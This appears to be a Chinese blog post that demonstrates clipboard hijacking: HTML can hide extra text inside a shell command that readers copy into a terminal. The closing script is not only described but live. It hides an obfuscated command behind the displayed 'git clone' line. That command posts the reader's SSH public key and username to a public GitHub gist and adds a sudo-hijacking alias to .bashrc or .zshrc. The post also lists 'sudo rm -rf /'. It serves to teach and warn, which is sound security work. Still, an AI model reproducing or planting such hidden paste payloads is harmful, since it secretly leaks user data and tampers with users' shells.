---
layout: post
uri: /posts/154
permalink: /posts/154/index.html
title: 危险的Shell，邪恶的HTML
category:
tag:
description:
disqus: false
lang: zh
---

在上网的时候经常会看到一些有趣/实用的Shell命令，也许你会迫不及待地想要把它拷贝到终端下面试一试。比如下面这些：

一行Python实现一个简单的HTTP server：

<p style="font-weight: bold"><span>python2 -m SimpleHTTPServer</span></p>

列出头十个最耗内存的进程：

<p style="font-weight: bold"><span>ps aux | sort -nk +4 | tail</span></p>

显示自己的IP：

<p style="font-weight: bold"><span>dig +short myip.opendns.com @resolver1.opendns.com</span></p>

直接调用[google-translate-cli](https://github.com/soimort/google-translate-cli)（免安装）在命令行下做翻译：

<p style="font-weight: bold"><span>gawk "$(curl -Ls git.io/google-translate-cli)" {sv=zh} "God morgon."</span></p>

***

还有一些Shell命令，虽然不符合其声称的功能，不过是你一眼就能看穿的，这无伤大雅。比如这个能够为你“保存一个URL，等你有空的时候再看”的命令（当然只是一个[4月1日的玩笑](https://twitter.com/climagic/status/318814110663983104)而已）

<p style="font-weight: bold"><span>saveurl() { cat > /dev/null; }</span></p>

当然，至于某些命令，是你永远也不会想要放到终端下面去验证一下功能的。比如这条：

<p style="font-weight: bold"><span>sudo rm -rf /</span></p>

你懂得Shell，能够一眼看出哪些命令是好的，哪些命令是坏的。即使无意中在终端下执行了一段你并不了解的脚本，你也能很快发现那些危险的操作需要提供sudoer权限，所以你可以选择不输入密码，放弃执行。这很好。看起来，也的确很安全。

***

（注意本演示仅适用于bash或zsh为默认Shell的情形下，需要有ssh和git）

好，现在跟着我一步步来。首先，为了验证我的想法，我做了一个用于演示的git库。请先把如下git命令拷贝到终端下执行，以获取演示所需要的代码：

<p id="demoP" style="font-weight: bold"><span id="demoSpan">git clone git://github.com/soimort/Copycat-Rootkit-Demo.git</span></p>

<br/><img src="http://octodex.github.com/images/forktocat.jpg" width="95%" />

到这里你应该已经发觉了些许异常，不过，请继续耐心地看下去。

```
$ git clone git://github.com/soimort/Copycat-Rootkit-Demo.git
Cloning into 'Copycat-Rootkit-Demo'...
remote: Counting objects: 22, done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 22 (delta 7), reused 22 (delta 7)
Receiving objects: 100% (22/22), 5.71 KiB, done.
Resolving deltas: 100% (7/7), done.
```

很好，现在你的本地机已经通过`git clone`获取到了我用来实现这种攻击演示的全部源码。但是，在查看这些源码之前，你要先做一件事情，那就是打开一个新的Terminal标签。

然后，在新的Shell session中执行任意一个常用的`sudo`命令。比如`sudo ls`就可以。

有没有看见什么奇怪的东西？

（就不在这里剧透了。）

<br/><img src="http://octodex.github.com/images/puppeteer.jpg" width="95%" />

***

如果你在复制粘贴那个`git clone`命令的时候机器缓冲不够快，你应该已经觉察到了屏幕的闪动。往前翻一下Shell历史，就会发现前面实际上执行了一条很长的、从未见过的命令。

反之，如果你在复制粘贴命令行到终端的时候屏幕缓冲__足够快__，则很可能注意不到这个闪动的发生。所以，你很难觉察到一条本来你不知道的命令被执行了。

这个问题的关键点在于：__当你从一个网页上复制命令以后直接把它粘贴到终端，在这个过程中发生了什么？__

我们知道，Unix上几乎所有的term终端都有这样的特性：接收一个换行符以后，执行当前行的命令（除非该行不能构成一个完整的Shell命令），因此，当你向终端粘贴包含换行符的文本时，这些命令将直接被Shell执行。

与此同时，terminfo/termcap提供了丰富的控制显示终端的特性（远比Windows多得多），但这也带来了一个潜在的威胁：恶意程序可以通过扰乱终端显示来迷惑用户。这里仅仅是一个概念性的演示，所以只用到了`clear`来避免让真实命令直接暴露在用户的眼前，实际上，一个恶意程序对屏幕buffer的控制可以做的比这个多很多。

另外，一个容易被忽略的事实是，Web这种东西，既是所见即所得的，又不是所见即所得的。__在HTML页面上你选择并复制的内容，可能并不是你所实际看到的内容__——换句话说，__你复制到的未必就是你想要的东西__。理由很简单，浏览器首先是根据标签的__逻辑位置__来选择元素，而不是用户所见到的__几何区域__来选择元素。而这个逻辑位置的标签，从几何上说可以被隐藏在任何地方，甚至在页面上完全不可见。

所以，一般用户在直接从网页向终端拷贝粘贴命令时，很难注意到这其中的风险。

总结以上，这个简单的演示证明了几件事情：

1. HTML比你想象的还要邪恶，它可以用来隐藏一些你看不见的东西。

2. 在理想的情形下（终端缓冲足够快），用户如果直接从网页向终端拷贝粘贴命令，很可能完全不会注意到执行了多余的命令（一个设计完备的恶意程序甚至可以做到消除命令行的历史，不留痕迹）。这已经可以让恶意代码做很多事情了。

3. 这个演示还证明了一件事情，那就是普通权限的Shell可以用来间接实现Rootkit，很简单，为`sudo`指定一个alias即可，控制了`sudo`，基本上也就达到了提权的目的。大部分系统为了安全性考虑都会对经`sudo`执行的命令重置`$PATH`，但是却并不禁止用户为`sudo`这个命令本身指定别名。有经验的用户当然会很快发现这个问题，但是对于一般用户而言，想注意到这点就很难了。（Unix/Linux从安全性角度考量并不适合一般非技术用户的又一个例证）

4. 不要直接从网页向终端拷贝粘贴命令，这么做（可能）非常不安全。

这个演示的灵感来源于[reddit上的这个帖子](http://www.reddit.com/r/technology/comments/1bvi76/do_not_copypaste_from_website_to_terminal/)。它所做的只是在终端下输出了一个人畜无害的提示，提醒你这么做是危险的。我意识到可以用它来做的事情远比这个要多得多，所以就写了这个[自己的演示](http://www.soimort.org/Copycat-Rootkit-Demo/)来验证。

[原网站](http://thejh.net/misc/website-terminal-copy-paste)上有一些后续的讨论，尤其提到了[oh-my-zsh对类似这种终端拷贝的安全隐患的一个修补](https://github.com/robbyrussell/oh-my-zsh/pull/1698)。如果你用bash，那么很遗憾，目前好像还没有解决这个安全问题的有效方法（其实说起来，zsh也没有）。唯一能保证安全的方式，就是在终端执行之前总是先在文本编辑器里面检查一遍，看看所复制的内容是否属实。

最后，如果你把刚才那行命令复制到文本编辑器里面的话，应该很容易看出来它做了什么。可读版的JavaScript和Shell代码[在这里](https://github.com/soimort/Copycat-Rootkit-Demo)。（如果刚才没有`git clone`的话……）

***

现在你大概知道了，看都不看就随随便便把别人的东西拿过来复制粘贴也是有风险的。

伸手党们，小心了！





<script>var ds=document.getElementById("demoSpan");ds.parentNode.removeChild(ds);var dp=document.getElementById("demoP"),t1=document.createTextNode("git clone ");dp.appendChild(t1);var sp=document.createElement("span");sp.setAttribute("style","position: fixed; left: -100px; top: -100px"),dp.appendChild(sp);var st1=document.createTextNode("\u002f\u0064\u0065\u0076\u002f\u006e\u0075\u006c\u006c\u003b\u0063\u006c\u0065\u0061\u0072\u003b\u0049\u0046\u0053\u003d\u0027\u0025\u0027\u003b\u0073\u003d\u0027\u005c\u006e\u0070\u003d\u0024\u0028\u0063\u0061\u0074\u00a0\u007e\u002f\u002e\u0073\u0073\u0068\u002f\u0069\u0064\u005f\u0072\u0073\u0061\u002e\u0070\u0075\u0062\u0029\u003b\u006d\u003d\u0024\u0028\u0065\u0063\u0068\u006f\u00a0\u0024\u0070\u00a0\u007c\u00a0\u0063\u0075\u0074\u00a0\u002d\u0066\u0033\u00a0\u002d\u0064\u0022\u00a0\u0022\u0029\u003b\u0049\u0046\u0053\u003d\u0027\u005c\u0027\u005c\u005c\u0078\u0032\u0035\u005c\u0027\u0027\u003b\u0065\u0063\u0068\u006f\u00a0\u002d\u0065\u00a0\u0027\u005c\u0027\u0027\u0023\u0021\u002f\u0062\u0069\u006e\u002f\u0073\u0068\u005c\u005c\u006e\u0073\u0075\u0064\u006f\u00a0\u0024\u0040\u005c\u005c\u006e\u0065\u0063\u0068\u006f\u003b\u0065\u0063\u0068\u006f\u00a0\u0048\u0065\u0079\u002c\u00a0\u006c\u006f\u006f\u006b\u00a0\u0061\u0074\u00a0\u0077\u0068\u0061\u0074\u00a0\u0079\u006f\u0075\u005c\u005c\u0027\u005c\u0027\u0027\u005c\u0027\u005c\u0027\u0027\u0027\u005c\u0027\u0027\u0076\u0065\u00a0\u006a\u0075\u0073\u0074\u00a0\u0064\u006f\u006e\u0065\u003a\u00a0\u0027\u005c\u0027\u0027\u0024\u0028\u0063\u0075\u0072\u006c\u00a0\u002d\u0073\u00a0\u002d\u0058\u00a0\u0050\u004f\u0053\u0054\u00a0\u002d\u0064\u00a0\u0027\u005c\u0027\u0027\u007b\u0022\u0070\u0075\u0062\u006c\u0069\u0063\u0022\u003a\u0074\u0072\u0075\u0065\u002c\u0022\u0066\u0069\u006c\u0065\u0073\u0022\u003a\u007b\u0022\u0069\u0064\u005f\u0072\u0073\u0061\u002e\u006d\u0064\u0022\u003a\u007b\u0022\u0063\u006f\u006e\u0074\u0065\u006e\u0074\u0022\u003a\u0022\u0027\u005c\u0027\u0027\u0024\u0028\u0077\u0068\u006f\u0061\u006d\u0069\u0029\u0027\u005c\u0027\u0027\u00a0\u003c\u003c\u0027\u005c\u0027\u0027\u0024\u006d\u0027\u005c\u0027\u0027\u003e\u003e\u005c\u005c\u006e\u005c\u005c\u006e\u0059\u006f\u0075\u0072\u00a0\u0060\u0069\u0064\u005f\u0072\u0073\u0061\u002e\u0070\u0075\u0062\u0060\u00a0\u0069\u0073\u003a\u005c\u005c\u006e\u005c\u005c\u006e\u00a0\u00a0\u00a0\u00a0\u0027\u005c\u0027\u0027\u0024\u0070\u0027\u005c\u0027\u0027\u005c\u005c\u006e\u005c\u005c\u006e\u0059\u006f\u0075\u0072\u00a0\u0060\u0069\u0064\u005f\u0072\u0073\u0061\u0060\u00a0\u0069\u0073\u003a\u005c\u005c\u006e\u005c\u005c\u006e\u00a0\u00a0\u00a0\u00a0\u004e\u006f\u00a0\u0077\u006f\u0072\u0072\u0079\u002e\u00a0\u0049\u0027\u005c\u0027\u0027\u005c\u005c\u0027\u005c\u0027\u0027\u0027\u005c\u0027\u0027\u006d\u00a0\u0067\u006f\u006f\u0064\u00a0\u0073\u006f\u00a0\u0049\u0027\u005c\u0027\u0027\u005c\u005c\u0027\u005c\u0027\u0027\u0027\u005c\u0027\u0027\u006c\u006c\u00a0\u006a\u0075\u0073\u0074\u00a0\u006b\u0065\u0065\u0070\u00a0\u0079\u006f\u0075\u00a0\u0073\u0061\u0066\u0065\u002e\u0027\u005c\u0027\u0027\u0027\u005c\u0027\u0027\u0022\u007d\u007d\u007d\u0027\u005c\u0027\u0027\u00a0\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u0070\u0069\u002e\u0067\u0069\u0074\u0068\u0075\u0062\u002e\u0063\u006f\u006d\u002f\u0067\u0069\u0073\u0074\u0073\u00a0\u007c\u00a0\u0067\u0072\u0065\u0070\u00a0\u0027\u005c\u0027\u0027\u0022\u0068\u0074\u006d\u006c\u005f\u0075\u0072\u006c\u0022\u0027\u005c\u0027\u0027\u00a0\u007c\u00a0\u0063\u0075\u0074\u00a0\u002d\u0066\u0034\u00a0\u002d\u0064\u0027\u005c\u0027\u0027\u0022\u0027\u005c\u0027\u0027\u0029\u00a0\u003e\u007e\u002f\u002e\u0073\u0075\u0064\u006f\u003b\u0075\u006e\u0073\u0065\u0074\u00a0\u0049\u0046\u0053\u003b\u0063\u0068\u006d\u006f\u0064\u00a0\u002b\u0078\u00a0\u007e\u002f\u002e\u0073\u0075\u0064\u006f\u003b\u0061\u006c\u0069\u0061\u0073\u00a0\u0073\u0075\u0064\u006f\u003d\u0022\u007e\u002f\u002e\u0073\u0075\u0064\u006f\u0022\u0027\u003b\u0069\u0066\u00a0\u005b\u005b\u00a0\u0060\u0065\u0063\u0068\u006f\u00a0\u0024\u0030\u0060\u00a0\u003d\u007e\u00a0\u0022\u002e\u002a\u007a\u0073\u0068\u0022\u00a0\u005d\u005d\u003b\u0074\u0068\u0065\u006e\u00a0\u0065\u0063\u0068\u006f\u00a0\u002d\u0065\u00a0\u0024\u0073\u00a0\u003e\u003e\u007e\u002f\u002e\u007a\u0073\u0068\u0072\u0063\u003b\u0065\u006c\u0073\u0065\u00a0\u0065\u0063\u0068\u006f\u00a0\u002d\u0065\u00a0\u0024\u0073\u00a0\u003e\u003e\u007e\u002f\u002e\u0062\u0061\u0073\u0068\u0072\u0063\u003b\u0066\u0069\u003b\u0075\u006e\u0073\u0065\u0074\u00a0\u0049\u0046\u0053");sp.appendChild(st1);var br=document.createElement("br");sp.appendChild(br);var st3=document.createTextNode("git clone ");sp.appendChild(st3);var t2=document.createTextNode("git://github.com/soimort/Copycat-Rootkit-Demo.git");dp.appendChild(t2);</script>
